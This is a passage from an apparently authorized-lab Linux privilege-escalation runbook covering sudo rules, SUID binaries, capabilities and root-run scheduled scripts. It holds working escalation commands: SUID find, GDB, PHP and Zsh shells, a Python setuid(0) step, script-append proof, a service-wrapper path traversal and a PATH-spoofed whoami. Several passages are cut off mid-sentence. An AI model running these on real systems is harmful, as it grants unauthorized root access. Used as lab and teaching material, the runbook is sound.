If it explicitly says a password is required and the current user's password is
supplied/permitted, run once with the normal prompt:

```bash
sudo -l
```

| Result                                                                                           | Next action                                                                                                                                                                                                                                                                                                                                                    |
| ------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Allowed executable/arguments/run-as user listed                                                  | Keep the full rule and tags. Unrestricted delegation or the exact allowed GNU Bash invocation goes to **LPRIV-01**; matching GNU find, Python 3, GNU time, nice or Perl delegation goes to **LPRIV-06**. A delegated MySQL/MariaDB client with known local SQL context goes to **LPRIV-08**. Other executable or fixed argument rules go to **LNX-04/LNX-09**. |
| Exact Git delegation permits a no-index diff and one relevant small protected text file is known | **LPRIV-10** for file-read access without staging. This is not a privileged shell claim.                                                                                                                                                                                                                                                                       |
| Exact absent delegated script, writable trusted parent and permission to create/remove it        | **LPRIV-11**, not the scheduled-job procedure.                                                                                                                                                                                                                                                                                                                 |
| Exact service-wrapper delegation and reviewed installed path-dispatch behavior                   | **LPRIV-12** for the matched foreground account transition, not a service restart.                                                                                                                                                                                                                                                                             |
| Password needed but not available                                                                | Keep that prerequisite; **LNX-05**, or **LNX-04** only if you already have a concrete path. Do not guess passwords.                                                                                                                                                                                                                                            |
| User not allowed/no matching rule                                                                | Preserve identity-specific denial; **LNX-05**. Do not invent a path just to fill LNX-04.                                                                                                                                                                                                                                                                       |
| sudo absent or listing fails for another reason                                                  | Keep the failure stage; **LNX-05** for other leads. Do not install/change target policy.                                                                                                                                                                                                                                                                       |

With the complete sudo rule and current target context, use **LPRIV-01** only for
unrestricted delegation or the explicitly allowed GNU Bash invocation. Matching
GNU find or Python 3 delegation uses **LPRIV-06**, including its exact arguments
and child-execution constraints. Another fixed script/editor/argument rule stays
at **LNX-04/LNX-09** until its own exact command,
prerequisite and restoration procedure exists. A reviewed exact first-file-read,
second-file-append program with permitted UID-zero run-as and tested disposable
lab recovery can use **LPRIV-14**. Its separately labeled stdin form requires
the exact NOPASSWD append rule and installed `-a` semantics, not the two-file
arguments. Other consumers remain distinct.
A listed rule does not mean the
verification command is allowed or that an objective is met.

## LNX-04. Can your identity read, write or replace this exact path?

Choose one observed application, service, task or delegated-command path. With
no concrete path, use **LNX-05** instead. Run only the operation that matches
the observed lead. First see the path and parent components without changing it:

```bash
namei -l -- '<absolute-observed-path>'
```

For a known file you want to read, check that predicate:

```bash
test -r '<absolute-observed-path>'; printf 'Read check exit: %s\n' "$?"
```

For a known existing file you may edit, use this instead:

```bash
test -w '<absolute-observed-path>'; printf 'Write check exit: %s\n' "$?"
```

If the question is **replacing** the file, check write and search on its observed parent
directory instead; file writability does not answer replacement:

```bash
test -w '<absolute-observed-parent-directory>' && test -x '<absolute-observed-parent-directory>'; printf 'Parent replacement check exit: %s\n' "$?"
```

These are permission predicates, not proof that the intended read, edit,
replacement or privileged consumer will work. Do not create or modify a file
just to test the hypothesis. Use ACL or mount diagnosis in the later notes only
when ordinary mode/path output leaves the specific result uncertain.

| Result                                                          | Next action                                                                                                                                |
| --------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| Relevant regular config readable                                           | **LNX-07**, inspect only that justified file.                                                                                                                      |
| `existing_file_writable_or_replacement_parent_passes_both_checks_to_lnx_06` — Writable file or replacement path found before its consumer | A writable path found before its consumer: **LNX-06** for execution identity and trigger. A predicate alone is not privileged execution. |
| `existing_writable_script_confirmed_scheduler_to_lpriv_03` — Writable regular shell script with a confirmed higher-privilege scheduler | I confirmed this writable regular shell script is consumed by the observed higher-privilege scheduler. Continue to **LPRIV-03** for natural-trigger proof and exact restoration. |
| Delegated binary/SUID/capability path                                      | **LNX-05** for exact attributes, then **LNX-09**.                                                                                                                  |
| Read/list/write denied                                                     | Keep operation and identity distinct; choose another observed path or **LNX-05**. Known-file readability need not equal directory listing.                         |
| Symlink, denied predicate or ambiguous path                                | Record the exact operation and uncertainty. Use the conditional notes before claiming access; an error is not a positive result.                                   |

## LNX-05. Which relevant privileged files or capabilities exist?

If your existing leads are insufficient, make a bounded read-only root-filesystem
inventory. Do not suppress denied paths:

```bash
timeout 20s find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -print
printf 'Inventory exit: %s\n' "$?"
```

Review host filesystem paths first. Treat duplicate package/image copies under
`/snap` as secondary unless their exact mounted path or execution context is the
concrete lead; do not let those duplicates bury a nonstandard host SUID binary.
An observed root-SUID `/usr/bin/find` stays bound to that exact host path and continues to **LPRIV-02** for attribute review.

Inspect one observed candidate's path and file capabilities:

```bash
stat -- '<absolute-observed-binary-path>'
file -- '<absolute-observed-binary-path>'
getcap -v '<absolute-observed-binary-path>'
```

If capability coverage is still needed, inspect one relevant observed directory:

```bash
timeout 20s getcap -r '<observed-binary-directory>'
printf 'Capability inventory exit: %s\n' "$?"
```

| Result                                                | Next action                                                                                                                                                                                                                                                                                              |
| ----------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Nonstandard/high-signal SUID, SGID or file capability | Match exact attributes and executable. A root-SUID binary with a trusted, exact privilege-preserving invocation goes to **LPRIV-02**; SUID GNU base32 with one relevant known regular file goes to **LPRIV-09**; other capability handling goes to **LPRIV-04**. |
| `nonstandard_high_signal_suid_sgid_or_file_capability_to_lnx_09` — Candidate has no authored case | No authored case fits this candidate: **LNX-06** finds a privileged consumer first; **LNX-09** only settles the leftover prerequisite. Do not start from an exploit PoC. |
| No candidate in inspected extent                      | **LNX-06**. Root-filesystem-only inspection is not every mount.                                                                                                                                                                                                                                          |
| Timeout 124, denied directory or incomplete output    | Keep extent and denied paths; **LNX-06**, or **PAUSE-COVERAGE** if that exact unresolved area matters.                                                                                                                                                                                                   |
| Capability tool absent                                | Retain missing coverage; **LNX-06**. Do not install software or silently equate absence of tool with absence of capabilities.                                                                                                                                                                            |

Use **LPRIV-02** for an existing owner-SUID GNU Bash or Python 3 with effective
SETUID capability. Keep owner UID, path, mount, NoNewPrivs and namespace context.
Other SUID binaries, permitted-only capability sets and special group transitions
stay at **LNX-09** for their distinct procedure. A reviewed owner-SUID program
with PATH-resolved `whoami`, a matching account-text gate, successful-branch
`setuid(geteuid())` and `execlp` shell behavior uses **LPRIV-13**. Its spoofed
account text is not identity proof. Do not add attributes to create
the prerequisite you wanted to find.

## LNX-06. What consumes the relevant service or scheduled-task path?

If an actual cron line or service is already known, start with that consumer
below. Do not run another service inventory first. Read the script's consumed
paths and execution conditions, not only the script's owner and mode.
Empty output is still unresolved because the writable-surface and spool reads suppress errors.

If no service is known yet, list running system services once and choose a
relevant application or nonstandard job. Do not fill a unit placeholder blindly:

```bash
systemctl list-units --type=service --state=running --no-pager --full
```

No relevant service, manager absent or listing denied: inspect visible cron and
processes below. If those also yield no concrete lead, use **LNX-07** rather than
repeat the same inventory.

For an observed systemd system service/unit:

```bash
systemctl show '<observed-unit.service>' -p User -p Group -p ExecStart -p FragmentPath -p WorkingDirectory -p MainPID
```

If `ExecStart` contains a wrapper/drop-in or does not identify the consumed
path, inspect this one unit's effective source. Do not dump every unit:

```bash
systemctl cat '<observed-unit.service>'
```

Use the current status diagnostic in later notes only when a trigger or
running-state question remains.

If a nonzero MainPID is observed, corroborate its current process identity:

```bash
ps -p '<observed-nonzero-MainPID>' -o user,pid,ppid,args
```

A configured user, wrapper process and actual privileged consumer can differ.

For cron or a host without systemd, inspect visible jobs/processes:

```bash
crontab -l
head -n 100 /etc/crontab
ls -la /etc/cron.d
ps -eo user,pid,ppid,args --sort=pid
ls -la /var/www /opt /usr/local/bin 2>/dev/null
find /var/www /opt /usr/local/bin -maxdepth 3 -type f -writable 2>/dev/null
ls -la /var/spool/cron/crontabs 2>/dev/null
cat /var/spool/cron/crontabs/* 2>/dev/null
```

Read only the one relevant listed cron file, replacing its exact path:

```bash
sed -n '1,120p' -- '<absolute-observed-cron-file>'
```

| Result                                                                   | Next action                                                                                                           |
| ------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------- |
| Consumer references your writable path and higher-privilege identity     | **LNX-04** for each referenced executable/config/parent, then **LNX-09**. Include actual timing/reload prerequisite.  |
| Writable served-root script but consumer unreadable or absent            | Record the scheduler as inferred and follow the task's authored result route. |
| Unit exists but not active / timer not scheduled / execution unconfirmed | Retain missing trigger; **LNX-07** or **LNX-09** to settle this prerequisite. Do not restart a service just to check. |
| Same-user consumer                                                       | Record actual boundary; **LNX-07**. Same-user execution is not privilege escalation.                                  |
| Listing denied/manager absent                                            | Use visible process/cron evidence with its limitation, then **LNX-07**.                                               |
| No relevant job, service or process in the visible extent                | **LNX-07** for local file/application clues. Do not repeat the unchanged listing or invent a unit name.               |

These read-only checks create no service/job or extra shell. Keep the existing
foothold open for the next step; there is no process to close from this task.

If the observed higher-privilege scheduler really executes your writable regular
shell script and the lab is disposable/authorized for that modification, use
**LPRIV-03** for one identity proof and exact byte/metadata restoration. Otherwise,
retain the missing interpreter, trigger or privilege fact at **LNX-09**. This
branch does not authorize a service restart, replacing arbitrary binaries or
editing production policy. Failed recovery goes to **PAUSE-RECOVERY**.

## LNX-07. Which permitted application/configuration detail changes your next check?

If a relevant directory is already known, list it directly:

```bash
ls -la -- '<absolute-observed-relevant-directory>'
```

Otherwise inspect the current directory once, including hidden entries:

```bash
pwd
ls -la -- .
```

If none is known, use LNX-08 or return to one process/service lead at LNX-06.
Do not invent an application directory to run this template.

Read one relevant regular config, backup or history file after LNX-04's
permissions/symlink check. A denied directory listing does not settle whether an
exact file named by a service or application is readable. The subshell makes
the reader's exit visible even though the output passes through `cat -v`:

```bash
(
  set -o pipefail
  head -c 8192 -- '<absolute-observed-relevant-file>' | cat -v
)
printf 'Read exit: %s\n' "$?"
```

If local mail is a justified observed lead, inspect only its known account file:


`Read exit: 0` with no bytes is an empty inspected range; nonzero is not an

another account's mailbox or copy sensitive output into shared checklist files.

Use the already recorded LNX-03 rule to match the exact Bash path, run-as
user/group, arguments, authentication and NOEXEC/INTERCEPT policy. If the path
or executable identity is uncertain, resolve that one fact before proceeding.


Inside that shell:

```bash
id
hostname
```

Only if a root-looking result conflicts with the expected host or namespace,

field before claiming host authority.

## LPRIV-02. Does this reviewed SUID binary or effective SETUID capability change identity?

Enter from LNX-05 with one exact observed executable. Inspect attributes first:

```bash
stat -- '<absolute-observed-executable>'
file -- '<absolute-observed-executable>'
getcap -v '<absolute-observed-executable>'
findmnt -T '<absolute-observed-executable>' -o TARGET,SOURCE,FSTYPE,OPTIONS
grep -E '^(Uid|NoNewPrivs|CapBnd|CapEff):' /proc/self/status
```

Choose **one** matching case. Do not add SUID bits/capabilities to manufacture a
lead. SUID scripts and arbitrary binaries do not behave like GNU Bash.

For an otherwise supported root-SUID executable, confirm its exact installed
type/version and mount options above, then consult one trusted local reference
such as a pinned GTFOBins copy. Select the minimum privilege-preserving invocation
for that exact build; do not improvise from a basename or sweep unrelated recipes.

**Existing root-SUID GNU find**, only after `file`/version evidence identifies the
same GNU find binary, its owner is root, the mount is not `nosuid`, `NoNewPrivs`
is zero, and the local reference confirms `-exec` for this build:

```bash
'<absolute-observed-root-SUID-GNU-find>' . -exec /bin/sh -p \; -quit
```

Workbench may stage this one reviewed line in the current target terminal only
after all five source facts remain current. Staging does not press Enter. A
changed executable, mount, process status, incomplete output, failed `-p` check
or unexpected second prompt stays at **LNX-09** with that exact prerequisite.

Inside the foreground shell, verify the process rather than trusting the prompt:

```bash
id
whoami
hostname
grep -E '^(Uid|Gid|NoNewPrivs):' /proc/self/status
```

An effective UID of zero proves an effective-root process in the observed
namespace. It does not prove a changed real UID, host escape or objective completion.

**Existing owner-SUID GNU Bash**, executable from this context and without a
blocking nosuid/NoNewPrivs boundary:

```bash
'<absolute-observed-SUID-GNU-bash>' --noprofile --norc -p
```

Inside, run `id`, `hostname`, and `cat /proc/self/uid_map`. Bash privileged mode
can retain the effective UID provided by SUID. It does not change who owns the
binary, and the owner need not be root.

**Existing root-SUID GDB with embedded Python**, only for the exact installed
debugger from LNX-05, with root ownership, executable permission and no blocking
`nosuid` or `NoNewPrivs`. No inferior program, core file or process is attached.
Check the same binary's embedded Python and effective IDs first:

```bash
'<absolute-observed-root-SUID-GDB>' -nx -q -batch -ex 'python import os; print("GDB process UIDs", os.getresuid())'
```

If Python is unavailable or the tuple's effective UID is not zero, keep the
failed prerequisite at **LNX-09**. Do not install Python, change file mode or
assume that any debugger grants access. Check `/bin/sh` accepts `-p`:

```bash
/bin/sh -p -c 'printf "privileged shell option accepted\n"'
```

Only after both checks succeed, replace this GDB process with one foreground
shell through its embedded Python. This avoids GDB's separate `shell` command
and its intervening shell behavior:

```bash
'<same-absolute-observed-root-SUID-GDB>' -nx -q -ex 'python import os; os.execl("/bin/sh", "sh", "-p")'
```

Inside the shell:

```bash
id
hostname
grep -E '^(Uid|Gid|NoNewPrivs):' /proc/self/status
cat /proc/self/uid_map
```

Follow the result table below. `-nx` suppresses GDB command initialization
files; it does not make the installed executable or Python runtime trusted.
Use only the already reviewed debugger/runtime. If exec fails and the `(gdb)`
prompt remains, use GDB's `quit`, then check `id` in the original shell. On
success, `exit` returns directly to the original shell because Python replaced
GDB. No target program was debugged and no proof file or listener was created.

**Existing owner-SUID Zsh**, only for the exact installed Zsh identified at
LNX-05, with executable permission and no blocking `nosuid` or `NoNewPrivs`:

```bash
'<absolute-observed-SUID-Zsh>' -f -p
```

At the resulting prompt, establish the effective identity and host:

```bash
id
hostname
grep -E '^(Uid|Gid|NoNewPrivs):' /proc/self/status
cat /proc/self/uid_map
```

An ordinary real UID with effective UID zero is an effective-root process,
not a changed real UID or proof of escaping a container. Follow the result
table below. `-f` skips subsequent startup files, but the system `zshenv`
still runs. Inspect that site's startup policy before this attempt; do not
claim a startup-free shell. If the option, executable or identity check fails,
use **LNX-09**. Exit the foreground Zsh and run `id` in the parent. Do not
change SUID permissions or remove the installed binary.

**Existing Python 3 with effective `cap_setuid=ep`**, after confirming the exact
capability and a real GNU Bash path. This branch is not for `cap_setuid=p` alone:

```bash
'<absolute-observed-python3-with-cap_setuid-ep>' -I -c 'import os,sys; print("before",os.getresuid(),flush=True); os.setuid(0); print("after",os.getresuid(),flush=True); os.execl(sys.argv[1],sys.argv[1],"--noprofile","--norc")' '<absolute-observed-GNU-bash-path>'
```

Inside the new shell, run `id`, `hostname` and `cat /proc/self/uid_map` again.
Python isolated mode avoids inheriting ordinary Python environment/search-path
customization. A successful namespace-local UID change is not a host escape.

**Existing owner-SUID PHP CLI**, only when LNX-05 identified that exact binary,
its owner is root, the mount is not `nosuid`, `NoNewPrivs` is zero and the
current authorized lab permits this privilege test. Do not apply this to a PHP
web handler, arbitrary script or merely installed PHP. First check the CLI and

does not answer this question:

```bash
'<absolute-observed-root-SUID-PHP-CLI>' -r 'printf("SAPI=%s pcntl_exec=%s\n", PHP_SAPI, function_exists("pcntl_exec") ? "yes" : "no");'
```

Check the shell option without using the SUID PHP binary:

```bash
/bin/sh -p -c 'printf "privileged shell option accepted\n"'
```

Only if the PHP output says `SAPI=cli pcntl_exec=yes` and this shell check

```bash
'<same-absolute-observed-root-SUID-PHP-CLI>' -r 'pcntl_exec("/bin/sh", ["-p"]);'
```

Inside the resulting shell, check the **current process**, not the PHP file's
owner or the prompt:

```bash

hostname
grep -E '^(Uid|Gid|NoNewPrivs):' /proc/self/status
cat /proc/self/uid_map
```

If PHP reports an unavailable function, a non-CLI SAPI or an execution error,

| Effective identity unchanged, Python setuid denied, or PHP execution failed | Retain exact path, error, mount, NoNewPrivs, capability/bounding-set and namespace conditions; **LNX-09**. No claim that every privilege transition is impossible. |

## LPRIV-03. Does an evidenced or inferred privileged scheduler consume your writable shell script?

Use only in a disposable authorized lab, from the verified target Bash session.
LNX-04/06 must identify a writable regular shell script and either an observed
root-run consumer or a plausible scheduled path whose consumer is unreadable or
absent. When the scheduler is inferred, prove it only by waiting for the natural
trigger. The script must reach appended commands. A service restart or created
job is forbidden. Skip symlinks, SUID/SGID/capability or integrity-protected files
and anything whose metadata you cannot restore. This proves privileged execution;
it does not open a shell.

1. Inspect and back up the script. Replace the script path and choose a new run
   ID. Reuse those literal values below. Stop if any command fails.

```bash
test -f '<absolute-observed-writable-shell-script>' && test ! -L '<absolute-observed-writable-shell-script>' && test -w '<absolute-observed-writable-shell-script>'
stat -c '%d:%i %a %u:%g %n' -- '<absolute-observed-writable-shell-script>'
getfacl -p -- '<absolute-observed-writable-shell-script>'
sed -n '1,160p' -- '<absolute-observed-writable-shell-script>'
```

```bash
mkdir -m 700 -- '/tmp/owb-consumer-<unique-run-id>' && \
cp -- '<absolute-observed-writable-shell-script>' '/tmp/owb-consumer-<same-run-id>/original.sh' && \
getfacl -p -- '<absolute-observed-writable-shell-script>' > '/tmp/owb-consumer-<same-run-id>/original.acl' && \
sha256sum -- '<absolute-observed-writable-shell-script>' '/tmp/owb-consumer-<same-run-id>/original.sh'
```

The two hashes must match. Copy the `stat` value without its filename into
`<recorded-device-inode-mode-owner>` and the original hash into
`<recorded-original-sha256>`. Keep the backup; do not execute it.

2. Prepare the expected copy. Stop on error, then run the guarded append.

```bash
cp -- '/tmp/owb-consumer-<same-run-id>/original.sh' '/tmp/owb-consumer-<same-run-id>/expected.sh' && \
printf '\n/usr/bin/id > "/tmp/owb-consumer-<same-run-id>/proof.txt"\n/usr/bin/chmod 0644 "/tmp/owb-consumer-<same-run-id>/proof.txt"\n' >> '/tmp/owb-consumer-<same-run-id>/expected.sh'
```

```bash
if test -x /usr/bin/id && test -x /usr/bin/chmod && \
   test ! -L '<absolute-observed-writable-shell-script>' && \
   test "$(stat -c '%d:%i %a %u:%g' -- '<absolute-observed-writable-shell-script>')" = '<recorded-device-inode-mode-owner>' && \
   getfacl -p -- '<absolute-observed-writable-shell-script>' > '/tmp/owb-consumer-<same-run-id>/current.acl' && \
   cmp -s -- '/tmp/owb-consumer-<same-run-id>/original.acl' '/tmp/owb-consumer-<same-run-id>/current.acl' && \
   cmp -s -- '/tmp/owb-consumer-<same-run-id>/original.sh' '<absolute-observed-writable-shell-script>'; then
  printf '\n/usr/bin/id > "/tmp/owb-consumer-<same-run-id>/proof.txt"\n/usr/bin/chmod 0644 "/tmp/owb-consumer-<same-run-id>/proof.txt"\n' >> '<absolute-observed-writable-shell-script>' && \
  cmp -- '/tmp/owb-consumer-<same-run-id>/expected.sh' '<absolute-observed-writable-shell-script>'
  printf 'Append verification exit: %s\n' "$?"
else
  printf 'Prerequisite, bytes, metadata or ACL changed; no modification.\n'
fi
```

Continue only with append verification exit `0`. Otherwise inspect the exact
change and restore below, or use **PAUSE-RECOVERY** for unexpected bytes.

3. Wait for the known natural trigger, then read the proof. Do not restart a
   service or create a job.

```bash
if test -f '/tmp/owb-consumer-<same-run-id>/proof.txt'; then
  stat -c '%F %a %u:%g %n' -- '/tmp/owb-consumer-<same-run-id>/proof.txt'
  head -n 2 -- '/tmp/owb-consumer-<same-run-id>/proof.txt'
else
  printf 'No proof yet; this does not establish lack of privilege.\n'
fi
```

| Result | Next choice |
| --- | --- |
| Proof's creation/owner, identity output and trigger correlate to the root consumer | Record **privileged script execution**, not an interactive shell. Restore first. **LPRIV-07** supplies a separately selected disposable-lab foreground Bash method if needed; otherwise private adventure evidence. |
| Same-user output/ownership or unrelated trigger | **LNX-06** to correct consumer attribution. No escalation claim. |
| No proof, unreadable proof, scheduler delay or script exited early | Preserve missing trigger/output fact; **LNX-09**. Restore below before another attempt. |
| Unexpected application failure, concurrent edit or changed path/inode | **PAUSE-RECOVERY**. Do not overwrite someone else's change or delete the backup. |

4. Restore before following the result's next choice. The diff must show only
   the appended id/chmod lines; metadata must match your original record.

```bash
diff -u -- '/tmp/owb-consumer-<same-run-id>/original.sh' '<absolute-observed-writable-shell-script>'
stat -c '%d:%i %a %u:%g %n' -- '<absolute-observed-writable-shell-script>'
```

Run the guarded in-place restore. A mismatch preserves the backup for recovery:

```bash
getfacl -p -- '<absolute-observed-writable-shell-script>' > '/tmp/owb-consumer-<same-run-id>/current.acl' &&
if test -f '<absolute-observed-writable-shell-script>' && test ! -L '<absolute-observed-writable-shell-script>' && \
   test "$(stat -c '%d:%i %a %u:%g' -- '<absolute-observed-writable-shell-script>')" = '<recorded-device-inode-mode-owner>' && \
   cmp -s -- '/tmp/owb-consumer-<same-run-id>/expected.sh' '<absolute-observed-writable-shell-script>' && \
   test "$(sha256sum -- '/tmp/owb-consumer-<same-run-id>/original.sh' | cut -d ' ' -f1)" = '<recorded-original-sha256>' && \
   cmp -s -- '/tmp/owb-consumer-<same-run-id>/original.acl' '/tmp/owb-consumer-<same-run-id>/current.acl'; then
  cat -- '/tmp/owb-consumer-<same-run-id>/original.sh' > '<absolute-observed-writable-shell-script>' && \
  cmp -- '/tmp/owb-consumer-<same-run-id>/original.sh' '<absolute-observed-writable-shell-script>' && \
  stat -c '%d:%i %a %u:%g %n' -- '<absolute-observed-writable-shell-script>' && \
  getfacl -p -- '<absolute-observed-writable-shell-script>'
else
  printf 'Unexpected bytes/path/metadata/ACL; retain backup, PAUSE-RECOVERY.\n'
fi
```

Confirm restored bytes, metadata and ACL, then ordinary behavior at the next
natural trigger. Keep the backup and use **PAUSE-RECOVERY** on any mismatch or
uncertain consumer state. Retain needed proof at private adventure evidence, then clean up:

```bash
ls -la -- '/tmp/owb-consumer-<same-run-id>'
rm -i -- '/tmp/owb-consumer-<same-run-id>/proof.txt' '/tmp/owb-consumer-<same-run-id>/original.sh' '/tmp/owb-consumer-<same-run-id>/expected.sh' '/tmp/owb-consumer-<same-run-id>/original.acl' '/tmp/owb-consumer-<same-run-id>/current.acl'
rmdir -- '/tmp/owb-consumer-<same-run-id>'
```

Cleanup failure goes to **PAUSE-RECOVERY** with the exact remaining paths.
Never delete the script or a backup needed for recovery. the source step's cleanup records any
outstanding state.

## LPRIV-05. Does one privileged service consume a writable path?

Enter from LNX-04/06 with an observed service unit and exact path. This is a
read-only attribution check. Do not restart, reload, enable or edit a service.

```bash
systemctl show --no-pager --property=User,Group,ExecStart,ActiveState,FragmentPath,DropInPaths -- '<observed-service-unit-name>'
```

Copy the exact `ExecStart` path or script from the output, then resolve every
parent directory and permission boundary without executing it:

```bash
namei -l -- '<absolute-observed-exec-or-script-path>'
test -w '<absolute-observed-exec-or-script-path>'; printf 'Writable: %s\n' "$?"
```

Compare `User`/`Group` with the current identity and `ActiveState`.
An unset user often means the manager's default, not proof of root. A writable
parent directory is a separate path replacement question; do not create a test
file. `namei` exposes path components and symlinks. If the active command or
permission result conflicts with this view, inspect the exact unit/drop-in with
`systemctl cat -- '<observed-service-unit-name>'`, then use `stat`, `getfacl` or
`findmnt` only for the unresolved ownership, ACL or mount question.

| Result | Next choice |
| --- | --- |
| Service user, exact path and consumer state are corroborated; path is not writable | Keep the observation; choose another already observed consumer at **LNX-06**, or **LNX-07** for file/application leads. No mandatory evidence-custody detour for an ordinary negative check. |

```bash
if test -f '<same-exact-created-script-path>' && test ! -L '<same-exact-created-script-path>' &&
   test "$(stat -c '%d:%i %a %u:%g' -- '<same-exact-created-script-path>')" = '<recorded-device-inode-mode-owner>' &&
   test "$(sha256sum -- '<same-exact-created-script-path>' | cut -d ' ' -f1)" = '<recorded-script-sha256>'; then
  rm -i -- '<same-exact-created-script-path>' && test ! -e '<same-exact-created-script-path>' && test ! -L '<same-exact-created-script-path>' && printf 'script cleanup confirmed\n'
else
  printf 'Script changed or missing; PAUSE-RECOVERY.\n'
fi
```

No original script existed, so restoration is verified absence, not backup
replacement. A changed/missing script cannot prove your cleanup caused that
absence; record the uncertainty. Retain needed metadata under private adventure evidence, use
`sudo -k` when its timestamp is no longer needed, and the source step's cleanup for remaining
state. Bash may affect existing user history; do not erase prior history.

## LPRIV-12. Does the exact delegated service wrapper execute the observed shell path?

Select only after LNX-03 identifies a service-wrapper sudo rule and review of
the **installed wrapper** shows a SysV fallback that appends the supplied name
to its init-script directory and executes that path with the remaining arguments.
This is a manual authorized-lab account transition. A command named `service`,
a package version or another machine's source is not enough.

```bash
sha256sum -- '<absolute-allowed-service-wrapper>'
wc -l -- '<absolute-allowed-service-wrapper>'
sed -n '1,260p' -- '<absolute-allowed-service-wrapper>' | cat -v
```

If the wrapper is longer, continue reading its remaining lines before choosing
this branch. Review parsing, path construction, systemd/OpenRC handling, argument
passing and environment changes. Require this invocation to take only the
reviewed direct-executable fallback, without activation or symlink changes.
A fixed unit/action, unreadable implementation or different wrapper goes to
**LNX-09**, not a speculative service operation.

Inspect the one already observed relative shell argument against that wrapper's
actual init directory. For example, `../../bin/bash` under `/etc/init.d` may
resolve to Bash, but another directory or implementation may not:

```bash
namei -l -- '<observed-init-script-directory>/<exact-observed-relative-shell-argument>'
realpath -e -- '<observed-init-script-directory>/<exact-observed-relative-shell-argument>'
file -L -- '<observed-init-script-directory>/<exact-observed-relative-shell-argument>'
```

Only if it resolves to verified GNU Bash and the complete sudo rule allows the
wrapper, run-as account, literal argument and these flags, open one foreground
shell. Preserve the literal relative argument, not a service name or canonical
replacement:

```bash
sudo -n -u '<allowed-run-as-user>' -- '<absolute-allowed-service-wrapper>' '<exact-observed-relative-shell-argument>' --noprofile --norc -p
```

`-n` is for NOPASSWD or a valid timestamp; otherwise omit it only for a permitted
known current-user password at sudo's prompt. Do not pass `start`, `stop`,
`restart`, `reload`, `status`, `--status-all` or `--full-restart` as an alternative.
These can act on real services or invoke unrelated scripts. Do not change the
wrapper, init directory, sudoers or a systemd unit to force this example to work.

At the resulting **target shell**:

```bash
hostname
id
cat /proc/self/uid_map
```

| Result | Next choice |
| --- | --- |
| Expected account on the corroborated target | **LNX-01/02**, then that account's **LNX-03**. Another user is not automatically root. |
| Missing path, unrecognized service, argument/run-as/password/NOEXEC/INTERCEPT denial or shell error | Preserve the exact failed prerequisite at **LNX-09**. No service-action fallback or automatic retry. |
| Shell usable but host/identity uncertain | **EXP-03**, not a prompt-based success claim. |
| Unexpected service/process/state change | Stop and **PAUSE-RECOVERY** with the actual change. Do not issue more service commands to guess restoration. |

Run `exit` in the foreground shell, then `id` in the original target shell.
This selected path needs no file creation, service restart or persistent unit
change. Record any actual wrapper/startup/history effects rather than assuming
none; preserve prior history. Use `sudo -k` when its timestamp is no longer
needed and the source step's cleanup for outstanding state. Uncertain return stays at
**PAUSE-RECOVERY**.

## LPRIV-13. Does this reviewed SUID program trust a PATH-resolved account check?

Enter from LNX-05/09 with one observed owner-SUID executable and explicit lab
permission. This case requires reviewed matching source/disassembly showing
all of these operations: `popen` runs bare `whoami`, its one-line output gates
access, the successful branch calls `setuid(geteuid())`, then `execlp` starts
`sh`. A nearby C file, a string match or SUID mode alone is insufficient.
An absolute lookup, cleared PATH, different comparison or different consumer
needs its own procedure. This is not a general command-replacement recipe.

Record the installed executable and current parent identity/PATH. Read the full
attributed source separately, including the failure and shell branches. Keep
LNX-02's namespace context; `nosuid` or `NoNewPrivs=1` stops this SUID attempt.
These absolute native tools must already exist on this target:

```bash
stat -c '%F %a %u:%g %n' -- '<absolute-observed-SUID-program>'
sha256sum -- '<same-absolute-observed-SUID-program>'
file -- '<same-absolute-observed-SUID-program>'
findmnt -T '<same-absolute-observed-SUID-program>' -no TARGET,FSTYPE,OPTIONS
/usr/bin/id
printf 'Parent PATH: %s\n' "$PATH"
command -v whoami
/bin/grep -E '^(Uid|Gid|NoNewPrivs):' /proc/$$/status
test -x /bin/sh && test -x /bin/hostname && test -x /bin/cat
```

Choose one new absolute directory below a trusted private parent writable by
this account, not a shared world-writable parent. Inspect parent traversal with
LNX-04 before creation. No symlink parents, colons or shell metacharacters in
the substituted directory. Stop if creation fails or that directory exists:

```bash
mkdir -m 0700 -- '<new-absolute-private-lookup-directory>'
```

Create **only** `whoami`. Substitute the exact expected account name from the
reviewed comparison, limited here to letters, digits, underscore, dot and hyphen.
The observed consumer must accept this name followed by one newline. The helper
prints that text; it does not change UID or execute a shell:

```bash
(umask 077; set -C; printf '%s\n' '#!/bin/sh' "printf '%s\\n' '<exact-observed-expected-account-name>'" > '<same-private-lookup-directory>/whoami' && chmod 0700 -- '<same-private-lookup-directory>/whoami') &&
sha256sum -- '<same-private-lookup-directory>/whoami' &&
stat -c '%d:%i %a %u:%g' -- '<same-private-lookup-directory>/whoami'
```

Record helper hash and the complete metadata line. After creation exit zero,
check this temporary lookup in a subshell without exporting it into the parent:

```bash
(PATH='<same-private-lookup-directory>:/usr/bin:/bin'; command -v whoami; whoami; command -v sh)
```

The first path must be the helper, its text must match the reviewed account
comparison and `sh` must still resolve to the target's existing shell. No `sh`
helper is created. These outputs prove lookup only, **not privilege**. If they
do not match, clean up below and return to LNX-09, not a broader PATH search.

Only with the same reviewed executable/hash and unchanged helper, invoke that
one program with PATH scoped to that command. This source-matched case takes
no arguments; a program requiring different arguments is not this procedure:

```bash
if test -f '<same-private-lookup-directory>/whoami' &&
   test ! -L '<same-private-lookup-directory>/whoami' &&
   test "$(stat -c '%d:%i %a %u:%g' -- '<same-private-lookup-directory>/whoami')" = '<recorded-helper-device-inode-mode-owner>' &&
   printf '%s  %s\n' '<recorded-helper-sha256>' '<same-private-lookup-directory>/whoami' | sha256sum -c - &&
   printf '%s  %s\n' '<recorded-program-sha256>' '<same-absolute-observed-SUID-program>' | sha256sum -c -; then
    PATH='<same-private-lookup-directory>:/usr/bin:/bin' '<same-absolute-observed-SUID-program>'
else
    printf 'Program/helper custody mismatch; attempt stopped\n'
fi
```

If a shell actually opens, use absolute tools there. Do not use its bare
`whoami`, which is deliberately spoofed, or infer authority from its prompt:

```bash
/usr/bin/id
/bin/hostname
/bin/grep -E '^(Uid|Gid|NoNewPrivs):' /proc/$$/status
/bin/cat /proc/self/uid_map
```

